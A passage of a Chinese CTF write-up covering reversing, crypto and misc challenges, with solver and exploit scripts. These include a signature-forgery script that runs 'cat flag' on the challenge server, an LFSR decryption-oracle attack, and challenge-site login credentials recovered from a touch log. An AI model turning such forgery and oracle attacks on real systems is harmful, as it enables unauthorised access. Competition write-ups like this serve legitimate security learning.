    0xD8,  0x50,  0x48,  0x60,
    0x46,  0x54,  0x43,  0x44,
    0x45,  0x49,  0x50,  0x55,
    0x52,  0x53,  0x4C,  0x47,
    0x58,  0x51,  0xF3,  0x50,
    0x8,  0x51, 0x10
]


array_5219 = [
    0xBD,  0x43,  0x11,  0x37,
    0xF2,  0x69,  0xAB,  0x2C,
    0x99,  0x13,  0x12,  0xD1,
    0x7E,  0x9A,  0x8F,   0xE,
    0x92,  0x37,  0xF4,  0xAA,
    0x4D,  0x77,   0x3,  0x89,
    0xCA,  0xFF,
]

array_5234 = [0 for _ in range(0x1a)]

in_C = 0

j = 0
for i in range(0x19, -1, -1):
    in_C = 1 if (0x19 < i + 1) else 0
    for j in range(0x30, 0x60):
        array_50c2[i] = j
        var1 = i
        
        var2 = 0
        if var1 & 1 == 0:
            array_5234[i] = array_50c2[i] ^ array_50c2[i + 1]
            var2 = i
            var1 = array_5234[i]
            array_5234[i] = ((var1 << 1) | ((array_50c2[i] + i) >> 7)) & 0xff
        else:
            array_5234[i] = array_50c2[i] ^ array_5219[i]
            var1 = array_5234[i]
            array_5234[i] = ((var1 << 1) | in_C) & 0xff
        if var1 >> 7 != 0:
            array_5234[i] = array_5234[i] + 1

        if array_5234[i] == target[i]:
            print (chr(j), end= '')
            break
    else:
        print ("no")
#KNOTS_ORT3R_M3D_T3G_GALP
```

![](https://i.imgur.com/d9DYwnI.png)

由于脚本为倒序输出，需要将得到字符串进行倒序处理，即FLAG_G3T_D3M_R3TR0_ST0NK
但是最后两个字符无法通过爆破得到，但题目的成功字符串给出了提示

![](https://i.imgur.com/ugkdasu.png)

![](https://i.imgur.com/qgWzLSs.png)

经过验证得出完整flag: FLAG_G3T_D3M_R3TR0_ST0NKZ!

### OLLVM (High)

通过逆向可以得知原控制流逻辑为

```
原始输入数据 989898121212
firstfn      2      sbuf[2] = not(-0x4DDB14EE5C8771C5-v)+1 = 0x4DDBAD86F49983D7
sub_46B1F0   0x1A   sbuf[4] = 0xB31C9545AC410D72
sub_40FA60   0x32   sbuf[5] = (sbuf[2] ^ 0xB31C9545AC410D72) + 0x8BC715D20D923835 = 0x8A8E4E95666AC6DA
sub_46B1F0   0x4A   sbuf[6] = 0xCE9A20C53746A9F7
sub_42C730   0x62   sbuf[7] = (sbuf[5] ^ sbuf[6]) << 32
sub_425760   0x7A   sbuf[8] = (sbuf[5] ^ sbuf[6]) >> 32
sub_43CDF0   0x92   sbuf[9] = (sbuf[7] | sbuf[8]) = 0x512C6F2D44146E50 ?
sub_46B1F0   0xAA   sbuf[10] = 0xA648BD40DACE4EF5
sub_439C40   0xC2   sbuf[11] = sbuf[9] * 0xA648BD40DACE4EF5 = 0x3CD903714589F290 = 0x512C6F2D44146E50 * 0xA648BD40DACE4EF5
sub_43F240   0xDA   sbuf[12] = sbuf[11] + 0x18B205A73CB902B7 = 0x558B09188242F547
sub_46B1F0   0xF2   sbuf[13] = 0x0000000000000008
sub_461DA0   0x10A  sbuf[14] = (sbuf[11] + 0x18B205A73CB902B7) >> 8 = 0x00558B09188242F5
sub_4195F0   0x122  sbuf[15] = (sbuf[12] << 56) | sbuf[14] = 0x47558B09188242F5
sub_46B1F0   0x13A  sbuf[16] = 0x29D5CA44D143B4FC
sub_447AC0   0x152  sbuf[17] = (sbuf[15]^0x326DEB9C5D995AEB)+0x29D5CA44D143B4FC=0x9F0E2ADA165ECD1A
sub_463ED0   0x16A  sbuf[18] = (sbuf[17] >> 8) = 0x009F0E2ADA165ECD
sub_42A9F0   0x182  sbuf[19] = (sbuf[17] >> 8) & 0x00FF00FF00FF00FF
sub_46B1F0   0x19A  sbuf[20] = 0x0000000000000008
sub_435E50   0x1B2  sbuf[21] = (sbuf[17] << 8) & 0xFF00FF00FF00FF00
sub_41EC00   0x1CA  sbuf[22] = example 0x9F0E2ADA165ECD1A -> 0x0E9FDA2A5E161ACD
sub_46B1F0   0x1E2  sbuf[23] = 0xB9B8A788569D772D
endfunction  0x1FA  sbuf[24] = -((sbuf[22] ^ 0xB9B8A788569D772D) * 0x51F6D71704B266F5)+1 = C54C16BC5F0898A0
```

求出逆运算,即可解密flag

乘法需要爆破,可以先爆破低32位,再爆破高32位,代码里我用多线程8核来爆破的

解密flag代码:

```c
#include <iostream>
#include "windows.h"

DWORD64 g_chunk_size = 0;

DWORD64 g_jieguo = 0;
DWORD64 g_chengshu = 0;

bool g_finded_low = false;
DWORD64 g_find_val_low = 0;

bool g_finded_high = false;
DWORD64 g_find_val_high = 0;
DWORD CalcThread(PVOID start_v) {
    DWORD64 ustartv = (DWORD64)start_v;
    DWORD targetv = g_jieguo & 0xFFFFFFFF;
    DWORD chengshulow = g_chengshu & 0xFFFFFFFF;
    for (DWORD64 i = 0; i < g_chunk_size; i++) {
        if (
            (((ustartv + i) * chengshulow) & 0xFFFFFFFF) == targetv
            ) {
            g_find_val_low = (ustartv + i);
            g_finded_low = true;
        }
        if (g_finded_low)
            break;
    }
    return 0;
}
DWORD CalcThreadHigh(PVOID start_v) {
    DWORD64 ustartv = (DWORD64)start_v;
    for (DWORD64 i = 0; i < g_chunk_size; i++) {
        ULONG64 vv = ((ustartv + i) << 32) | (g_find_val_low);
        if (
            (vv * g_chengshu) == g_jieguo
            ) {
            g_find_val_high = (ustartv + i);
            g_finded_high = true;
        }
        if (g_finded_high)
            break;
    }
    return 0;
}

DWORD64 findchengshu(DWORD64 jieguo, DWORD64 chengshu) {
    g_chengshu = chengshu;
    g_jieguo = jieguo;
    g_finded_low = 0;
    g_find_val_low = 0;
    g_finded_high = 0;
    g_find_val_high = 0;

    int heshu = 8;

    DWORD64 block_size = (0x100000000 / heshu);
    g_chunk_size = block_size;
    for (int i = 0; i < heshu; i++) {
        DWORD tid = 0;
        CreateThread(0, 0, CalcThread, (LPVOID)(block_size * i), 0, &tid);
    }

    while (g_finded_low == false)
        Sleep(10);
    
    for (int i = 0; i < heshu; i++) {
        DWORD tid = 0;
        CreateThread(0, 0, CalcThreadHigh, (LPVOID)(block_size * i), 0, &tid);
    }

    while (g_finded_high == false)
        Sleep(10);
    return g_find_val_low | (((ULONG64)g_find_val_high) << 32);
}
DWORD64 reneg(DWORD64 v) {
    return ~v + 1;
}
DWORD64 re22(DWORD64 v) {
    DWORD64 _1 = v & 0xFF;
    DWORD64 _2 = (v & 0xFF00) >> 8;
    DWORD64 _3 = (v & 0xFFFFFF) >> 16;
    DWORD64 _4 = (v & 0xFFFFFFFF) >> 24;
    DWORD64 _5 = (v & 0xFFFFFFFFFF) >> 32;
    DWORD64 _6 = (v & 0xFFFFFFFFFFFF) >> 40;
    DWORD64 _7 = (v & 0xFFFFFFFFFFFFFF) >> 48;
    DWORD64 _8 = (v & 0xFFFFFFFFFFFFFFFF) >> 56;

    return _2 | (_1 << 8) | (_4 << 16) | (_3 << 24) | (_6 << 32) | (_5 << 40) | (_8 << 48) | (_7 << 56);

}
DWORD64 re15(DWORD64 v) {
    return ((v & 0x00FFFFFFFFFFFFFF) << 8) | (v >> 56);
}
DWORD64 re9(DWORD64 v) {
    DWORD64 nv = ((v >> 32) & 0xFFFFFFFF) | (v << 32);

    return nv ^ 0xCE9A20C53746A9F7;
}
DWORD64 invertVal(DWORD64 v) {
    v = reneg(v);
    v = findchengshu(v, 0x51F6D71704B266F5);
    v = v ^ 0xB9B8A788569D772D;
    v = re22(v);
    v -= 0x29D5CA44D143B4FC;
    v ^= 0x326DEB9C5D995AEB;
    v = re15(v);
    v -= 0x18B205A73CB902B7;
    v = findchengshu(v, 0xA648BD40DACE4EF5);
    v = re9(v);
    v -= 0x8BC715D20D923835;
    v ^= 0xB31C9545AC410D72;
    v = reneg(v);
    v += 0x4DDB14EE5C8771C5;
    v = ~v + 1;

    return v;
}
DWORD64 reval(DWORD64 v) {
    DWORD64 _1 = v & 0xFF;
    DWORD64 _2 = (v & 0xFF00) >> 8;
    DWORD64 _3 = (v & 0xFFFFFF) >> 16;
    DWORD64 _4 = (v & 0xFFFFFFFF) >> 24;
    DWORD64 _5 = (v & 0xFFFFFFFFFF) >> 32;
    DWORD64 _6 = (v & 0xFFFFFFFFFFFF) >> 40;
    DWORD64 _7 = (v & 0xFFFFFFFFFFFFFF) >> 48;
    DWORD64 _8 = (v & 0xFFFFFFFFFFFFFFFF) >> 56;

    return _8 | (_7 << 8) | (_6 << 16) | (_5 << 24) | (_4 << 32) | (_3 << 40) | (_2 << 48) | (_1 << 56);
}
int main()
{
    DWORD64 val[9]; 
    val[8] = 0;
    val[0] = reval(invertVal(0x875cd4f2e18f8fc4));
    val[1] = reval(invertVal(0xbb093e17e5d3fa42));
    val[2] = reval(invertVal(0xada5dd034aae16b4));
    val[3] = reval(invertVal(0x97322728fea51225));
    val[4] = reval(invertVal(0x4124799d72188d0d));
    val[5] = reval(invertVal(0x2b3e3fbbb4d44981));
    val[6] = reval(invertVal(0xdfcac668321e4daa));
    val[7] = reval(invertVal(0xeac2137a35c8923a));
    printf("%s\n", val);
}
```

### PYCOIN(Low)

先使用uncompyle6反编译，发现执行了一串marshal字节码
将该字节码输出到文件，然后根据题目给的pyc补全文件头
再次反编译发现有花指令，开头和中间各有一个 `jump_forward`，中间还有两个连续的 `rot_tow`
花指令全替换成nop就可以进行反编译了

```python
from hashlib import md5
k = str(input('please supply a valid key:')).encode()
correct = len(k) == 16 and k[0] == 102 and k[1] == k[0] + 6 and k[2] == k[1] - k[0] + 91 and k[3] == 103 and k[4] == k[11] * 3 - 42 and k[5] == sum(k) - 1322 and k[6] + k[7] + k[10] == 260 and int(chr(k[7]) * 2) + 1 == k[9] and k[8] % 17 == 16 and k[9] == k[8] * 2 and md5(k[10] * b'a').digest()[0] - 1 == k[3] and k[11] == 55 and k[12] == k[14] / 2 - 2 and k[13] == k[10] * k[8] % 32 * 2 - 1 and k[14] == (k[12] ^ k[9] ^ k[15]) * 3 - 23 and k[15] == 125
print(f"valid key! {k.decode()}" 
      if correct else 'invalid key :(')
```

随后用z3求解

```python
from z3 import *

s = Solver()

k = [BitVec('k%d' % i, 8) for i in range(16)]

s.add(k[0] == 102)
s.add(k[1] == k[0] + 6)
s.add(k[2] == (k[1] - k[0]) + 91)
s.add(k[3] == 103)
s.add(k[4] == k[11] * 3 - 42)
s.add(k[11] == 55)
s.add(k[10] == 101)
s.add(k[15] == 125)
s.add(k[5] == sum(k) - 1322)
s.add(k[6] + k[7] + k[10] == 260)
# s.add(int(chr(k[7]) * 2) + 1 == k[9])
s.add(k[7] > 0x30)
s.add(k[7] < 0x40)
s.add((k[7] - 0x30) * 11 + 1 == k[9])
s.add(k[8] % 17 == 16)
s.add(k[9] == k[8] * 2)
# s.add(md5(k[10] * b'a').digest()[0] - 1 == k[3])
s.add(k[12] == k[14] / 2 - 2)
s.add(k[13] == (k[10] * k[8] % 32) * 2 - 1)
s.add(k[14] == (k[12] ^ k[9] ^ k[15]) * 3 - 23)

if s.check():
    model = s.model()
    for i in range(16):
        if i == 5:
            continue
        print (chr(model[k[i]].as_long()), end='')
else:
    print ("No result")
#flag{f92de703d}
```

## Crypto

### Silver Water Industries(Low)

go语言写的加密，审计一下代码，大致意思就是首先随机产生一个token和N，然后加密token，加密方式为一个字节8个比特，每次产生一个x,若该比特为0，结果为x^2 %N,否则结果为-x^2 %n。显然利用二次剩余来做，如果c,n的雅可比符号为1则为0,否则为1,还原token，再传给服务器

```python
from gmpy2 import *

n=285093357453242924013602862066919842439
c=['[7901544350463174591988078511923324618 184537633212194745105080990647249325476 38267354157968351348766484298141745170 115578755446448863198748495896654060883 227909878717027446328962010664108571738 68952806770118848950271133491209711403 102984378629787175198877216543195333448 113165098929714836603634331678300868297]',
'[275785769863995996812546673147981657234 282132616793095905121920207741461086689 199143850961491870800209491624969361487 183070115427467531790361759454036865061 174393613375943957860321020903916142619 275194645696846365608618082603600388856 69288446973059562436205397370105909769 250845592176683528425664336374779963821]',
'[240850912688047949049104289493502779367 37079483245590817588925021564795982646 284919536320463992115907743100691646551 267192067339793515017095456897132371813 121182789195982671419488187218656063538 130399763650220078736112759705997664043 58302430717741410187195454791677533281 52776571634234783572905063268137693827]',
'[169777727664099029285002240103810929277 154451872004779288578874468507232138100 82607738862097099187707193194906553213 74662089586650151383705654824195379245 163301594729741444134552005626107105446 108759358332127220212407980222708706220 246214280347131537365215918063843772859 116415814239906926802482107105787268443]',
'[908795231417421999718079313192191569 113455638257352165842372458444946217639 227447469062670411453330654385127815004 283532690966429919679614173872514718001 276175993211834485081856703624558763131 173640901552892130398996800843730480762 76779834958653181435792827716925863702 206290664138933571395486720765404890504]',
'[123026279266464883266609008668623052393 40509778382957676307060245062252843393 95602462953785104138868279951166751882 43531259745075979730966911287989076615 82865327448522727488114604383808371535 207895953061666333553235571802877275412 65646216101552631749973551787307289641 123721676641648433423267884043005926042]',
'[84235175585568651415313489109394597433 19269802923648441086555654660091822017 55658696563260880937491989834257209829 234537578061003475348324817681194241847 59802057487646966284905470410391468989 128776397130280003156298859718500600288 58714047777453918627738504174915596756 5382371557403759511409510761755596277]',
'[142277648732395720338819526212844406606 105745456860747198927985508383729091578 7664467883802846117259187758423823692 192823773181406078295010428559954020697 35520988140119792330289151131523684908 76369098233361904415663724932463253635 257882448880941611481506133326850304617 201269699223045546065503672803127316556]',
'[184609218721168183180805721365560584754 185020056544825781738449415772019342386 128805039558112680342001303071294028640 10656747463930421123322245691391167264 256942413240582039041230005139151025018 199624812561500081484838114437018161725 261608146489322534451783563132106825107 197042738069178244994802319518477132885]',
'[270173223698478270395600379839285853220 57941625935617136420077100942293109042 42866159881477101699934525188688478291 246776886005156260287696971384169750083 137171422362434302212095391922793796625 189256954049770715201795707892595939413 122402164719872436761127887207817393790 98066517796093669928393689884743077086]',
'[228483823411430971765632614756935594262 270867761665365061602695324172148308695 270682585589276777781448680945567679788 213507765198029256400141067987133373726 76037731708593018888930325428923617568 30682862786884871003242427010850491072 167298978250225467829760031606711270085 72822666625837066035637817957473696601]',
'[195360134168787557177461554506460108718 122308058514175020254833726324781052273 225146579830375254258394356703192766275 141448314831908836605197528091870487865 150984932528304035512378115089222613654 258513501018477452331175661114007493672 280750213283721060295861114047761297997 149688812218926847069069885299483586476]',
'[39751280632280049247741325771978681046 126855003643133686822494937986884309325 115180417419233183793165658750256344391 165938790171278140853730464165871696036 125785499316292959084455022571711272463 113018734944080600564983861961988444496 121333906833173879138713882299961654246 74854082980047960871154066988489234830]',
'[137318192742872999161232833053514199378 77303525632818524122343716610518443942 160269374197044199668350654249626402587 115833901383881866816610270277305149900 208252536116807546101734823290785501108 217944947974996128948835835464385601397 166097670266427048341426239212284108828 6804019980433054638881349231392552603]',
'[223303329908928292177045252540723878662 162073383009692124348835494388447606848 75684161198666039016621659050855083132 214809882035378545846738708974574594313 87881170698279792546809027489142288582 209684762911442115958995698637848828382 62250525374182677523486425819610947199 279847608325021186228379026650485946576]',
'[67984665902369694514999957506279439994 268381222641753282423880203957876639758 246945134892118899884699312748250139309 65992451070302178885369398606163545606 116843550219931501998786016165547932075 183992253565936581165613292055256448566 263733379385279468893508349748581537056 271771128787717918335624952723447691861]',
'[243684657592111494155573374100758277706 199888678572875313963836033529833113400 144529013312000077536517713640604480652 195346356780285790893865181659755080639 177192461902687091902497281184780912038 98619970825132499781249548734139906601 75338491010152968387510315283944125602 235096138241797869586420967960223530601]',
'[72151893808127002595348778087435224319 81726004275189558083196981094140189988 120182868897691025353764768886735207100 202139727058084483577259545137210899092 172363102516135760004141577739481722490 47134074008080627610223569691660297614 123362836929825076302183828024021376167 223183587970484310511105130772286701816]',
'[198229942846513253072302724550917821624 203790104834341577744516837088067561528 268462473934338408807986146010492366120 2838111217330153826487758479090332221 24168375885146064383306126685127043568 106145968666962799863332198895828734493 210842459276905023853370050105467358280 279918790313996396021668388694087973972]',
'[279958295787638180753395460799528194681 282632555284078775050842945928105322059 236625278255622713621309747554901434361 152370360457970139981070013834891821455 279957343826025692192966948867958440827 283163488212063405065442268900136281469 13585301929645503773034214420121810733 84973170341472624058356167001596150486]']

for i in c:
    temp=i[1:-1].split(' ')
    flag=''.join(['0' if jacobi(int(j),n)==1  else '1' for j in temp])
    print(chr(int(flag,2)),end='')
#token=XF38YOg92IRNyugYD7go
#flag{Oh_NO_aT_LEast_mY_AlGORithM_is_ExpanDiNg}    
```

### WhatTheHecc(mid):

感觉可能是非预期？

题目里提供了sign，run，show功能，但sign里支持的命令有限，而如果我们需要通过run拿到flag则需要伪造签名，因此看一下verify函数，可以得知：

![](https://i.imgur.com/fq5nnKL.png)

但这里实现有点问题，verify的sig是能够自己控制的，因此如果

![](https://i.imgur.com/xevQDXy.png)

则此时同样等式成立，验证通过

```python
from netcat import *
from Cryptodome.Hash import SHA3_256
from Cryptodome.PublicKey import ECC
from Cryptodome.Math.Numbers import Integer

def hash(msg):
    h_obj = SHA3_256.new()
    h_obj.update(msg.encode())
    return Integer.from_bytes(h_obj.digest())


r = remote("flu.xxx", 20085)
print(r.recv_until(b">"))
r.sendline(b"show")
r.recv_until(b"point_x=")
Rx = int(r.recv_until(b", point_y=").decode().replace(", point_y=", ""))
Ry = int(r.recv_until(b")").decode().replace(")", ""))
print(Rx, Ry)

hmsg = hash("cat flag")
ecc = ECC.generate(curve='P-256')
tmp = hmsg * ecc._curve.G
hx, hy = tmp.x, tmp.y
print(hx, hy)

print(r.recv_until(b">"))
r.sendline(b"run")
sig = f"{Rx}|{Ry}|{hmsg}|cat flag"
print(r.recv_until(b">"))
r.sendline(sig.encode())
print(r.recv_until(b"}"))

r.close()
```

### lwsr(mid):

(当时比赛的时候没有做出来,就差了一点,本地通了,远程出了一些问题,但还是复现一下)

每次decrypt能够知道state&1，因此如结果为Success!，则state的末尾比特为1，反之则为0，而每次lfsr产生的newbit在首位，因此如果交互384次，就能拿到clear LFSR bits后的初始比特。然后再回推最原始的状态，每次一位，那么每次只用考虑爆破1bit，然后检查lfsr(回推值)是否等于当前值，回退384+len(ct)次即可。得到初始状态后只需要再相应密文位减去pk，判断c%q是否为0即可，为0则当前明文比特为0，反之为1。

```python
from Crypto.Util.number import long_to_bytes
from netcat import *

def lfsr(state):
    # x^384 + x^8 + x^7 + x^6 + x^4 + x^3 + x^2 + x + 1
    mask   = (1 << 384) - (1 << 377) + 1
    newbit = bin(state & mask).count('1') & 1
    return (state >> 1) | (newbit << 383)

r = remote("flu.xxx", 20075)
r.recvuntil(b"Public key (q = 16411):")
tmp = r.recvuntil(b"Encrypting flag:\n").decode().replace("Encrypting flag:\n", "")
pk = eval(tmp)
length = 352
ct = []
for i in range(length):
    tmp = r.recvuntil(b"\n").strip().decode()
    #print(tmp)
    c = eval(tmp)
    #print(c[1], c)
    ct.append(c)

s = ""
for i in range(384):
    r.recvuntil(b"Your message bit: \n")
    r.sendline(b"1")
    res = r.recvuntil(b"\n").strip()
    if res == b"Success!":
        #print(1, res)
        s = "1" + s
    else:
        #print(0, res)
        s = "0" + s

t = int(s, 2)
def solve(t):
    state = t
    for i in "01":
        tmp = bin(state)[2:].zfill(384)[1:] + i
        tmp = int(tmp, 2)
        if lfsr(tmp) == state:
            return tmp
state = t

for i in range(384+length):
    state = solve(state)
flag = ""
for _ in range(length):
    c = ct[_][1]
    for i in range(384):
        if (state >> i) & 1 == 1:
            tmp += "1"
            c -= pk[i][1]
    c = c % 16411
    if c == 0:
        flag += "0"
    else:
        flag += "1"
    state = lfsr(state)

print(long_to_bytes(int(flag, 2)))
r.close()
#flag{your_fluxmarket_stock_may_shift_up_now}
```

## Misc:

### Tenbagger(NONE):

流量文件中存在大量无法被解密的TLS流量，且多数网站通过DNS解析记录得知目标为正常网站，不在本题目范围内。
在此过滤所有TLS、DNS流量以及其指向的地址。
发现FIX协议的本地到本地发送的流量，而该协议为金融相关，断定题目关键位置在此。

![](https://i.imgur.com/26qPyFS.png)

拼接即可

flag:
```
flag{t0_th3_m00n_4nd_b4ck}
```

### Touchy Logger(Low):

整个触屏过程很复杂，但我们只需要提取出明显的点击操作，具体就是：TOUCH_DOWN、TOUCH_FRAME 和 TOUCH_UP 三个合成一组的指令

```python
import re
import numpy as np
import cv2

pattern = r' event5   TOUCH_DOWN       \+[\d]{1,3}\.[\d]{1,3}s\t0 \(0\)[ ]{1,3}[\d]{1,3}\.[\d]{1,3}/[\d]{1,3}\.[\d]{1,3} \([\d]{1,3}\.[\d]{1,3}/[\d]{2,3}\.[\d]{2}mm\)\n'
pattern += r' event5   TOUCH_FRAME      \+[\d]{1,3}\.[\d]{1,3}s\t\n'
pattern += r' event5   TOUCH_UP         \+[\d]{1,3}\.[\d]{1,3}'

f = open('touch.log', 'r')
content = f.read()
f.close()

rows = re.findall(pattern, content)

def cap():
    timePattern=re.compile(r'\+([0-9]+)\.([0-9]{3})s')
    coodPattern=re.compile(r'\( ?([0-9\.]+)/ ?([0-9\.]+)mm\)')
    
    for row in rows:
        time=timePattern.search(row)
        time=int(time.group(1))*1000+int(time.group(2))
        p=coodPattern.search(row)
        x=float(p.group(1))
        y=float(p.group(2))
        yield ('',time,x,y)

fourcc = cv2.VideoWriter_fourcc(*'XVID')
fps=10.0
out = cv2.VideoWriter('touch.avi', fourcc, fps, (259, 173))
history=[[]]
totalTime=0
for i in cap():
    time=i[1]
    history[-1].append((i[2],i[3]))
    frame=np.zeros((173,259,3),np.uint8)+255
    for j in history[:-1]:
        for k in j:
            cv2.circle(frame,(int(k[0]),int(k[1])),1,(0,0,0),-1)
    for k in history[-1]:
        cv2.circle(frame,(int(k[0]),int(k[1])),1,(0,255,0),-1)

    while totalTime<time:
        print(totalTime)
        totalTime+=100
        out.write(frame)
out.release()
```

然后，用 Pr 或 Ae 将一个 Ubuntu 虚拟键盘的图片放上去，就可以看得比较清楚：
不支持在 Docs 外粘贴 block
最后捕捉到的关键输入内容：

![](https://s3.bmp.ovh/imgs/2021/11/155dafc66b51bad9.gif)


网站：https://investment24.flu.xxx/user/login

![](https://i.imgur.com/bvyiVYR.png)


账号：fluxmanfred
密码：OiVyi)=wi$?;Ezq-lZx# 
登录就是 flag 了

![](https://i.imgur.com/6lz6qy6.png)

flag:
```
flag{only_diamond_h4nds_can_touch_this}
```
